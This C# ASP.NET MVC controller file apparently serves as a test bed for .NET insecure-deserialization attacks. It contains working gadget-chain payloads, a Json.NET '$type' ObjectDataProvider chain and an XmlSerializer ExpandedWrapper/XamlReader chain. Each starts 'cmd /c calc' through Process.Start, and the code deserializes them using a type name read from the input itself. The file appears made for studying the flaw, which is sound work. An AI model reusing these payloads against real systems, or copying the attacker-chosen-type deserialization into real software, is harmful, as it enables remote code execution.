using System;
using System.IO;
using System.Web.Mvc;
using System.Xml;
using System.Xml.Serialization;
using mvcapp.ExampleClasses;
using mvcapp.UseCases;

namespace mvcapp.Controllers
{
    public class HomeController : Controller
    {
        public ActionResult Index()
        {
            return View();
        }

        public ActionResult About()
        {
            ViewBag.Message = "Your application description page.";

            //UseCaseOne.Run();
            //UseCaseTwo.Run();
            //UseCaseThree.Run();
            //UseCaseFour.Run();
            //UseCaseFive.Run();
            UseCaseSix.Run();


            //var complex = new ComplexConstructor("powershell.exe")
            //{
            //    ID = 3,
            //};

            //var serializedComplex = JsonConvert.SerializeObject(complex, new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All });

            //{"$type":"mvcapp.Models.Simple, mvcapp","ID":1,"Value":"Some test string."}
            //{"$type":"mvcapp.Models.Simple, mvcapp","ID":1,"Value":{"$type":"mvcapp.Models.Simple, mvcapp","ID":2,"Value":"Some test string 2."}}
            //{"$type":"mvcapp.Models.ComplexConstructor, mvcapp","ID":3,"Parameters":"powershell.exe"}

            string payloadWithComplexConstructor = "{\"$type\":\"mvcapp.Models.Simple, mvcapp\",\"ID\":1,\"Value\":{\"$type\":\"mvcapp.Models.ComplexConstructor, mvcapp\",\"ID\":2,\"Parameters\":\"powershell.exe\"}}";
            string payloadWithComplexSetter = "{\"$type\":\"mvcapp.Models.Simple, mvcapp\",\"ID\":1,\"Value\":{\"$type\":\"mvcapp.Models.ComplexSetter, mvcapp\",\"ID\":2,\"Parameters\":\"powershell.exe\"}}";

            string objectDataProviderPayload = @"{
                '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
                'MethodName':'Start',
                'MethodParameters':{
                    '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                    '$values':['cmd','/ccalc']
                },
                'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
            }";

            string payloadWithObjectDataProviderPayload ="{\"$type\":\"mvcapp.Models.Simple, mvcapp\",\"ID\":1,\"Value\":"+ objectDataProviderPayload +"}";



            return View();
        }

        public ActionResult Contact()
        {
            ViewBag.Message = "Your contact page.";

            var simple = new Simple
            {
                ID = 1,
                Value = "Some test string."
            };

            var simple2 = new Simple
            {
                ID = 2,
                Value = "Some test string 2."
            };

            var complex = new ComplexConstructor("powershell.exe")
            {
                ID = 3,
            };

            simple.Value = simple2;
            string output;

            var xmlSerializer = new XmlSerializer(typeof(Simple));

            using (StringWriter stringWriter = new StringWriter())
            {
                xmlSerializer.Serialize(stringWriter, simple);
                output = stringWriter.ToString();
            }

            /*
            <?xml version="1.0" encoding="utf-16"?>
            <Simple xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
              <ID>1</ID>
              <Value xsi:type="Simple">
                <ID>2</ID>
                <Value xsi:type="xsd:string">Some test string 2.</Value>
              </Value>
            </Simple>
            */

            /*
             <?xml version="1.0" encoding="utf-16"?>
            <Simple xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
              <ID>1</ID>
              <Value xsi:type="ComplexConstructor">
                <ID>3</ID>
                <Parameters>powershell.exe</Parameters>
              </Value>
            </Simple>
             */

            output = @"<?xml version=""1.0"" encoding=""utf-16""?>
            <Simple xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"">
              <ID>1</ID>
              <Value xsi:type=""ComplexConstructor"">
                <ID>3</ID>
                <Parameters>powershell.exe</Parameters>
              </Value>
            </Simple>";

            using (StringReader stringReader = new StringReader(output))
            {
                object deserializedObject = xmlSerializer.Deserialize(stringReader);
            }

            string output2 = @"<?xml version=""1.0"" encoding=""utf-16""?>
            <ComplexSetter xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"">
              <ID>1</ID>
              <Parameters>powershell.exe</Parameters>
            </ComplexSetter>";

            var xmlSerializer2 = new XmlSerializer(typeof(ComplexSetter));

            using (StringReader stringReader = new StringReader(output2))
            {
                object deserializedObject = xmlSerializer2.Deserialize(stringReader);
            }

            /*
             <root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
    <ExpandedWrapperOfXamlReaderObjectDataProvider>
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">
                    &lt;ResourceDictionary xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot; xmlns:System=&quot;clr-namespace:System;assembly=mscorlib&quot; xmlns:Diag=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&gt;
                        &lt;ObjectDataProvider x:Key=&quot;LaunchCmd&quot; ObjectType=&quot;{x:Type Diag:Process}&quot; MethodName=&quot;Start&quot;&gt;
                            &lt;ObjectDataProvider.MethodParameters&gt;
                                &lt;System:String&gt;cmd&lt;/System:String&gt;
                                &lt;System:String&gt;/c calc&lt;/System:String&gt;
                            &lt;/ObjectDataProvider.MethodParameters&gt;
                        &lt;/ObjectDataProvider&gt;
                    &lt;/ResourceDictionary&gt;
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type="XamlReader"></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
             */


            string payload3 =
                "<root xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" type=\"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\">\r\n    <ExpandedWrapperOfXamlReaderObjectDataProvider>\r\n        <ExpandedElement/>\r\n        <ProjectedProperty0>\r\n            <MethodName>Parse</MethodName>\r\n            <MethodParameters>\r\n                <anyType xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xsi:type=\"xsd:string\">\r\n                    &lt;ResourceDictionary xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot; xmlns:System=&quot;clr-namespace:System;assembly=mscorlib&quot; xmlns:Diag=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&gt;\r\n                        &lt;ObjectDataProvider x:Key=&quot;LaunchCmd&quot; ObjectType=&quot;{x:Type Diag:Process}&quot; MethodName=&quot;Start&quot;&gt;\r\n                            &lt;ObjectDataProvider.MethodParameters&gt;\r\n                                &lt;System:String&gt;cmd&lt;/System:String&gt;\r\n                                &lt;System:String&gt;/c calc&lt;/System:String&gt;\r\n                            &lt;/ObjectDataProvider.MethodParameters&gt;\r\n                        &lt;/ObjectDataProvider&gt;\r\n                    &lt;/ResourceDictionary&gt;\r\n                </anyType>\r\n            </MethodParameters>\r\n            <ObjectInstance xsi:type=\"XamlReader\"></ObjectInstance>\r\n        </ProjectedProperty0>\r\n    </ExpandedWrapperOfXamlReaderObjectDataProvider>\r\n</root>";


            var xmlDoc = new XmlDocument();
            xmlDoc.LoadXml(payload3);
            XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode("root");
            var type = new XmlSerializer(Type.GetType(xmlItem.GetAttribute("type")));
            using (var textReader = new StringReader(xmlItem.InnerXml))
            {
                var deserialized = type.Deserialize(new XmlTextReader(textReader));
            }
            return View();
        }
    }
}